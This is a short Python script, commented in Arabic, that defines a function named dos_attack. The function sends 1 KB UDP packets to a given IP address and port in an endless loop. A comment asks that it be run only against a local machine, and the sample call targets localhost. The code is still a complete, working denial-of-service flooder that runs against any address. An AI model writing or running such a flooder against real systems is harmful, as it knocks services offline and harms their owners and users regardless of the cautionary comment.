import socket

def dos_attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"A" * 1024  # إرسال بيانات بحجم 1KB في كل مرة
    while True:
        sock.sendto(payload, (target_ip, target_port))
        print(f"تم إرسال الحزمة إلى {target_ip}:{target_port}")

# تشغيل الهجوم (قم بتغيير الـ IP والبورت إلى الجهاز المستهدف في بيئة محلية فقط)
# dos_attack("127.0.0.1", 80)
